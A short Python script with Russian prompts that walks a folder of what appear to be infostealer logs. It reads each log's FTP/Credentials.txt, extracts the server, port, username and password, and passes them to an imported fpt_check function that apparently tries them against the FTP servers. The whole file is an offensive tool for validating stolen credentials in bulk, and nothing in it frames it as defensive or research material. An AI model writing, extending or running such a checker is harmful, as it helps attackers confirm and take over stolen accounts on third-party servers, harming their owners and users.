from os import path
from glob import glob
from lib.clear import clear
from lib.install_lib import install
from lib.menu import menu
from lib.ftp_data import fpt_check

def start():
	install()
	while True:
		clear()
		data = input('''Работает drag&drop
Введите путь до базы
[Путь]=> ''')
		data = data.replace('"', '').replace("'", '')
		if path.exists(data):
			break
		input('Папка не найдена')
	check_logs(data)

def check_logs(data):
	for log in glob(f'{data}/*'):
		ftp = f'{log}/FTP/Credentials.txt'
		if path.exists(ftp):
			with open(ftp, errors='ignore') as file:
				lines = file.readlines()
				for i in range(len(lines)):
					if lines[i].startswith('Server:'):
						server_port = lines[i][8:].strip()
						server, port = server_port.split(':')
						username = lines[i+1][10:].strip()
						password = lines[i+2][10:].strip()
						fpt_check(server, port, username, password)
